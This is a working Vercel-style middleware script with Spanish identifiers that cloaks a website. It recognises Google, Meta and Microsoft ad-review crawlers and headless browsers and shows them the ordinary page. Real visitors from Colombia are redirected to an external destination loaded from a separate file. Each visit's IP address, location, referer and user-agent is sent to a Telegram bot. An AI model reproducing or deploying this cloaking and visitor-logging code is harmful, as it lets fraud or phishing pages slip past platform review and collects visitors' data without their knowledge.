export const config = {
  matcher: ["/", "/index.html"]
};

const BOT_REVISION_RE = /googlebot-image|googlebot-video|googlebot-news|googlebot|storebot-google|google-inspectiontool|googleother-image|googleother-video|googleother|google-cloudvertexbot|google-extended|google-cws|google-gemininotebook|google-notebooklm|google-agent|googlemessages|google-pinpoint|googleproducer|google-read-aloud|google-site-verification|google-speakr|googleweblight|google favicon|feedfetcher-google|apis-google|adsbot-google-mobile-apps|adsbot-google-mobile|adsbot-google|mediapartners-google|google-safety|google-amphtml|google-pagerenderer|google-adwords|google-ads|googleassociation|google-structured-data|chrome-lighthouse|pagespeed|adidxbot|bingbot|bingpreview|microsoftpreview|msnbot-media|msnbot|skypeuripreview|linkedinbot|bingads|microsoft-advertising|facebookexternalhit|facebookexternalua|facebookcatalog|facebookplatform|facebookscraper|facebookbot|facebot|meta-externalads|meta-externalagent|meta-externalfetcher|meta-webindexer|headlesschrome|phantomjs|puppeteer|playwright/i;

function esBot(ua) {
  ua = String(ua || "");
  if (!ua) return false;
  if (BOT_REVISION_RE.test(ua)) return true;
  if (/google\.com\/(bot|adsbot|mobile\/adsbot|feedfetcher)\.html/i.test(ua)) return true;
  if (/developers\.google\.com\/crawling/i.test(ua)) return true;
  if (/bing\.com\/bingbot\.htm/i.test(ua)) return true;
  if (/aka\.ms\/microsoftpreview/i.test(ua)) return true;
  if (/facebook\.com\/externalhit/i.test(ua)) return true;
  if (/developers\.facebook\.com\/docs\/sharing\/webmasters\/web-crawlers/i.test(ua)) return true;
  return false;
}

function primerMatch(ua, patrones) {
  for (var i = 0; i < patrones.length; i++) {
    var m = ua.match(patrones[i]);
    if (m) return m[0];
  }
  return "";
}

function etiquetaBot(ua) {
  ua = String(ua || "");
  var meta = primerMatch(ua, [
    /meta-externalads/i,
    /meta-externalagent/i,
    /meta-externalfetcher/i,
    /meta-webindexer/i,
    /facebookexternalhit/i,
    /facebookcatalog/i,
    /facebookbot/i,
    /facebot/i
  ]);
  if (meta) return { empresa: "Facebook / Meta", nombre: meta };

  var ms = primerMatch(ua, [
    /adidxbot/i,
    /bingpreview/i,
    /microsoftpreview/i,
    /bingbot/i,
    /msnbot-media/i,
    /msnbot/i,
    /skypeuripreview/i,
    /linkedinbot/i
  ]);
  if (ms) return { empresa: "Microsoft", nombre: ms };

  var google = primerMatch(ua, [
    /adsbot-google-mobile-apps/i,
    /adsbot-google-mobile/i,
    /adsbot-google/i,
    /mediapartners-google/i,
    /googlebot-image/i,
    /googlebot-video/i,
    /googlebot-news/i,
    /storebot-google/i,
    /google-inspectiontool/i,
    /googleother-image/i,
    /googleother-video/i,
    /googleother/i,
    /google-cloudvertexbot/i,
    /google-extended/i,
    /google-cws/i,
    /google-gemininotebook/i,
    /google-notebooklm/i,
    /google-agent/i,
    /googlemessages/i,
    /google-pinpoint/i,
    /googleproducer/i,
    /google-read-aloud/i,
    /google-site-verification/i,
    /google-speakr/i,
    /googleweblight/i,
    /google favicon/i,
    /feedfetcher-google/i,
    /apis-google/i,
    /google-safety/i,
    /chrome-lighthouse/i,
    /pagespeed/i,
    /googlebot/i
  ]);
  if (google) return { empresa: "Google", nombre: google };

  var prueba = primerMatch(ua, [/headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i]);
  if (prueba) return { empresa: "Herramienta de prueba", nombre: prueba };

  return { empresa: "Bot de revisión", nombre: "desconocido" };
}

function bandera(codigo) {
  codigo = String(codigo || "").toUpperCase();
  if (!/^[A-Z]{2}$/.test(codigo)) return "";
  return String.fromCodePoint(127397 + codigo.charCodeAt(0), 127397 + codigo.charCodeAt(1));
}

function decodificar(v) {
  try {
    return decodeURIComponent(String(v || "").replace(/\+/g, " "));
  } catch (e) {
    return String(v || "");
  }
}

function ipDe(request) {
  var forwarded = String(request.headers.get("x-forwarded-for") || request.headers.get("x-vercel-forwarded-for") || "");
  if (forwarded) return forwarded.split(",")[0].trim();
  return String(request.headers.get("x-real-ip") || request.headers.get("x-vercel-ip") || "-");
}

function textoVisita(request, bot) {
  var ua = String(request.headers.get("user-agent") || "-");
  var pais = String(request.headers.get("x-vercel-ip-country") || "-").toUpperCase();
  var ciudad = decodificar(request.headers.get("x-vercel-ip-city"));
  var region = decodificar(request.headers.get("x-vercel-ip-country-region"));
  var hora = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
  var referer = String(request.headers.get("referer") || "-");
  var emoji = bandera(pais);
  var paisConBandera = emoji ? (emoji + " " + pais) : pais;
  var lugar = [ciudad, region, paisConBandera].filter(Boolean).join(" · ");
  var lineas;

  if (bot) {
    var info = etiquetaBot(ua);
    lineas = [
      "🤖 Bot de revisión",
      "Empresa: " + info.empresa,
      "Crawler: " + info.nombre,
      "Lugar: " + (lugar || "-"),
      "IP: " + ipDe(request),
      "Hora: " + hora,
      "Referer: " + referer,
      "UA: " + ua
    ];
  } else {
    var accion = pais === "CO" ? "redirigido (🇨🇴 Colombia)" : "vio la página (no Colombia)";
    lineas = [
      "👤 Persona",
      "Acción: " + accion,
      "Lugar: " + (lugar || "-"),
      "IP: " + ipDe(request),
      "Hora: " + hora,
      "Referer: " + referer,
      "UA: " + ua
    ];
  }
  return lineas.join("\n");
}

function leerCredencial(js, clave, fallback) {
  var m = String(js || "").match(new RegExp(clave + "\\s*:\\s*[\"']([^\"']+)[\"']"));
  return (m && m[1]) || fallback || "";
}

async function credencialesTelegram(request) {
  var token = process.env.TELEGRAM_BOT_TOKEN || "";
  var chat = process.env.TELEGRAM_CHAT_ID || "";
  if (token && chat) return { token: token, chat: chat };
  try {
    var js = await fetch(new URL("/TELEGRAM.js", request.url), { cache: "no-store" }).then(function (r) {
      return r.text();
    });
    token = token || leerCredencial(js, "token");
    chat = chat || leerCredencial(js, "chat");
  } catch (e) {}
  return { token: token, chat: chat };
}

function avisarTelegram(texto, cred) {
  var token = cred && cred.token;
  var chatRaw = String((cred && cred.chat) || "");
  if (!token || !chatRaw) return Promise.resolve();
  var partes = chatRaw.split("#");
  var body = {
    chat_id: partes[0],
    text: texto,
    disable_web_page_preview: true
  };
  if (partes[1]) body.message_thread_id = Number(partes[1]);
  return fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body)
  }).then(function (r) {
    return r.text();
  }).catch(function () {});
}

function conTiempo(promesa, ms) {
  return Promise.race([
    promesa,
    new Promise(function (resolve) {
      setTimeout(resolve, ms);
    })
  ]);
}

export default async function middleware(request) {
  var purpose = String(request.headers.get("purpose") || request.headers.get("sec-purpose") || "");
  if (/prefetch/i.test(purpose)) return;

  var ua = request.headers.get("user-agent");
  var bot = esBot(ua);
  var aviso = credencialesTelegram(request).then(function (cred) {
    return avisarTelegram(textoVisita(request, bot), cred);
  });

  if (bot) {
    await conTiempo(aviso, 2000);
    return;
  }

  var country = String(request.headers.get("x-vercel-ip-country") || "").toUpperCase();
  if (country !== "CO") {
    await conTiempo(aviso, 2000);
    return;
  }

  try {
    var js = await fetch(new URL("/ENLACES-IP.js", request.url), { cache: "no-store" }).then(function (r) {
      return r.text();
    });
    await conTiempo(aviso, 2000);
    var match = js.match(/colombia\s*:\s*["']([^"']+)["']/);
    if (!match) return;
    var dest = match[1];
    var destUrl = new URL(dest, request.url);
    if (destUrl.origin === new URL(request.url).origin) return;
    return Response.redirect(dest, 302);
  } catch (e) {
    await conTiempo(aviso, 2000);
    return;
  }
}
